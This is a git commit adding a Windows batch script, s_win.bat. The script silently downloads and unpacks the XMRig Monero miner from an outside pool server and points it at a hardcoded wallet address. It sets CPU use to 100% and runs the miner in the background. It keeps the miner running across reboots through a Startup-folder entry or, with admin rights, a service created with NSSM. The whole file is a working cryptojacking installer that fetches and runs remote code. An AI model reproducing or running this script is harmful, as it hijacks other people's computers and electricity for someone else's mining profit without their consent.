07de87060d202f1f550d980968781f3350515bc7
charlieqwq <87477870+charlieqwq@users.noreply.github.com>
2023-01-29 23:57:22 +0800

    Add files via upload

---
+++ s_win.bat
@@ -0,0 +1,302 @@
+@echo off
+
+
+net session >nul 2>&1
+if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)
+
+
+
+if ["%USERPROFILE%"] == [""] (
+  echo ERROR: Please define USERPROFILE environment variable to your user directory
+  exit /b 1
+)
+
+if not exist "%USERPROFILE%" (
+  echo ERROR: Please make sure user directory %USERPROFILE% exists
+  exit /b 1
+)
+
+where wmic >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "wmic" utility to work correctly
+  exit /b 1
+)
+
+where powershell >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "powershell" utility to work correctly
+  exit /b 1
+)
+
+where find >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "find" utility to work correctly
+  exit /b 1
+)
+
+where findstr >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "findstr" utility to work correctly
+  exit /b 1
+)
+
+where tasklist >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "tasklist" utility to work correctly
+  exit /b 1
+)
+
+if %ADMIN% == 1 (
+  where sc >NUL
+  if not %errorlevel% == 0 (
+    echo ERROR: This script requires "sc" utility to work correctly
+    exit /b 1
+  )
+)
+
+
+for /f "tokens=*" %%a in ('wmic cpu get SocketDesignation /Format:List ^| findstr /r /v "^$" ^| find /c /v ""') do set CPU_SOCKETS=%%a
+if [%CPU_SOCKETS%] == [] ( 
+  set CPU_SOCKETS=1
+)
+
+for /f "tokens=*" %%a in ('wmic cpu get NumberOfCores /Format:List ^| findstr /r /v "^$"') do set CPU_CORES_PER_SOCKET=%%a
+for /f "tokens=1,* delims==" %%a in ("%CPU_CORES_PER_SOCKET%") do set CPU_CORES_PER_SOCKET=%%b
+if [%CPU_CORES_PER_SOCKET%] == [] ( 
+  set CPU_CORES_PER_SOCKET=1
+)
+
+for /f "tokens=*" %%a in ('wmic cpu get NumberOfLogicalProcessors /Format:List ^| findstr /r /v "^$"') do set CPU_THREADS=%%a
+for /f "tokens=1,* delims==" %%a in ("%CPU_THREADS%") do set CPU_THREADS=%%b
+if [%CPU_THREADS%] == [] ( 
+  set CPU_THREADS=1
+)
+set /a "CPU_THREADS = %CPU_SOCKETS% * %CPU_THREADS%"
+
+for /f "tokens=*" %%a in ('wmic cpu get MaxClockSpeed /Format:List ^| findstr /r /v "^$"') do set CPU_MHZ=%%a
+for /f "tokens=1,* delims==" %%a in ("%CPU_MHZ%") do set CPU_MHZ=%%b
+if [%CPU_MHZ%] == [] ( 
+  set CPU_MHZ=1000
+)
+
+for /f "tokens=*" %%a in ('wmic cpu get L2CacheSize /Format:List ^| findstr /r /v "^$"') do set CPU_L2_CACHE=%%a
+for /f "tokens=1,* delims==" %%a in ("%CPU_L2_CACHE%") do set CPU_L2_CACHE=%%b
+if [%CPU_L2_CACHE%] == [] ( 
+  set CPU_L2_CACHE=256
+)
+
+for /f "tokens=*" %%a in ('wmic cpu get L3CacheSize /Format:List ^| findstr /r /v "^$"') do set CPU_L3_CACHE=%%a
+for /f "tokens=1,* delims==" %%a in ("%CPU_L3_CACHE%") do set CPU_L3_CACHE=%%b
+if [%CPU_L3_CACHE%] == [] ( 
+  set CPU_L3_CACHE=2048
+)
+
+set /a "TOTAL_CACHE = %CPU_SOCKETS% * (%CPU_L2_CACHE% / %CPU_CORES_PER_SOCKET% + %CPU_L3_CACHE%)"
+
+set /a "CACHE_THREADS = %TOTAL_CACHE% / 2048"
+
+if %CPU_THREADS% lss %CACHE_THREADS% (
+  set /a "EXP_MONERO_HASHRATE = %CPU_THREADS% * (%CPU_MHZ% * 20 / 1000) * 5"
+) else (
+  set /a "EXP_MONERO_HASHRATE = %CACHE_THREADS% * (%CPU_MHZ% * 20 / 1000) * 5"
+)
+
+
+
+if %EXP_MONERO_HASHRATE% gtr 208400  ( set PORT=19999 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 102400  ( set PORT=19999 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 51200  ( set PORT=15555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 25600  ( set PORT=13333 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 12800  ( set PORT=13333 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 6400  ( set PORT=13333 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=13333 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=13333 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 800   ( set PORT=80 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 400   ( set PORT=80 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 200   ( set PORT=80 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 100   ( set PORT=80 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr  50   ( set PORT=80 & goto PORT_OK )
+set PORT=80
+
+:PORT_OK
+
+sc stop c3pool_miner
+sc delete c3pool_miner
+taskkill /f /t /im xmrig.exe
+
+:REMOVE_DIR0
+
+rmdir /q /s "%USERPROFILE%\c3pool" >NUL 2>NUL
+IF EXIST "%USERPROFILE%\c3pool" GOTO REMOVE_DIR0
+
+
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
+if errorlevel 1 (
+  goto MINER_BAD
+)
+
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\c3pool')"
+if errorlevel 1 (
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  if errorlevel 1 (
+    exit /b 1
+  )
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\xmrig.zip" >NUL
+  del "%USERPROFILE%\7za.exe"
+)
+del "%USERPROFILE%\xmrig.zip"
+
+powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+"%USERPROFILE%\c3pool\xmrig.exe" --help >NUL
+if %ERRORLEVEL% equ 0 goto MINER_OK
+:MINER_BAD
+
+
+for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
+set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
+
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
+if errorlevel 1 (
+ 
+  exit /b 1
+)
+
+:REMOVE_DIR1
+
+rmdir /q /s "%USERPROFILE%\c3pool" >NUL 2>NUL
+IF EXIST "%USERPROFILE%\c3pool" GOTO REMOVE_DIR1
+
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\c3pool')"
+if errorlevel 1 (
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  if errorlevel 1 (
+    exit /b 1
+  )
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\xmrig.zip" >NUL
+  if errorlevel 1 (
+    exit /b 1
+  )
+  del "%USERPROFILE%\7za.exe"
+)
+del "%USERPROFILE%\xmrig.zip"
+
+powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+"%USERPROFILE%\c3pool\xmrig.exe" --help >NUL
+if %ERRORLEVEL% equ 0 goto MINER_OK
+
+
+exit /b 1
+
+:MINER_OK
+
+for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
+if [%PASS%] == [] (
+  set PASS=na
+)
+
+
+powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"auto.c3pool.org:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"47M97YZvsrJ939q5SWCQbY9fjyupm5optLZP36atgZ4SfaSi6TzK1RjReopEezHaEK4uoJD8k5CL4PX5hEJYBAmRBi8amVC\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+
+copy /Y "%USERPROFILE%\c3pool\config.json" "%USERPROFILE%\c3pool\config_background.json" >NUL
+powershell -Command "$out = cat '%USERPROFILE%\c3pool\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config_background.json'" 
+
+rem preparing script
+(
+echo @echo off
+echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
+echo if errorlevel 1 goto ALREADY_RUNNING
+echo start /low %%~dp0xmrig.exe %%^*
+echo goto EXIT
+echo :ALREADY_RUNNING
+echo echo Monero miner is already running in the background. Refusing to run another one.
+echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
+echo :EXIT
+) > "%USERPROFILE%\c3pool\miner.bat"
+
+rem preparing script background work and work under reboot
+
+if %ADMIN% == 1 goto ADMIN_MINER_SETUP
+
+if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+  goto STARTUP_DIR_OK
+)
+if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
+  goto STARTUP_DIR_OK  
+)
+
+echo ERROR: Can't find Windows startup directory
+exit /b 1
+
+:STARTUP_DIR_OK
+(
+echo @echo off
+echo "%USERPROFILE%\c3pool\miner.bat" --config="%USERPROFILE%\c3pool\config_background.json"
+) > "%STARTUP_DIR%\c3pool_miner.bat"
+
+call "%STARTUP_DIR%\c3pool_miner.bat"
+goto OK
+
+:ADMIN_MINER_SETUP
+
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
+if errorlevel 1 (
+  exit /b 1
+)
+
+echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\c3pool"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\c3pool')"
+if errorlevel 1 (
+  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  if errorlevel 1 (
+    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+    exit /b 1
+  )
+  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\c3pool"
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\nssm.zip" >NUL
+  if errorlevel 1 (
+    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\c3pool"
+    exit /b 1
+  )
+  del "%USERPROFILE%\7za.exe"
+)
+del "%USERPROFILE%\nssm.zip"
+
+echo [*] Creating c3pool_miner service
+sc stop c3pool_miner
+sc delete c3pool_miner
+"%USERPROFILE%\c3pool\nssm.exe" install c3pool_miner "%USERPROFILE%\c3pool\xmrig.exe"
+if errorlevel 1 (
+  echo ERROR: Can't create c3pool_miner service
+  exit /b 1
+)
+"%USERPROFILE%\c3pool\nssm.exe" set c3pool_miner AppDirectory "%USERPROFILE%\c3pool"
+"%USERPROFILE%\c3pool\nssm.exe" set c3pool_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
+"%USERPROFILE%\c3pool\nssm.exe" set c3pool_miner AppStdout "%USERPROFILE%\c3pool\stdout"
+"%USERPROFILE%\c3pool\nssm.exe" set c3pool_miner AppStderr "%USERPROFILE%\c3pool\stderr"
+
+echo [*] Starting c3pool_miner service
+"%USERPROFILE%\c3pool\nssm.exe" start c3pool_miner
+if errorlevel 1 (
+  echo ERROR: Can't start c3pool_miner service
+  exit /b 1
+)
+goto OK
+
+:OK
+exit /b 0
+
+:strlen string len
+setlocal EnableDelayedExpansion
+set "token=#%~1" & set "len=0"
+for /L %%A in (12,-1,0) do (
+  set/A "len|=1<<%%A"
+  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
+)
+endlocal & set %~2=%len%
+exit /b
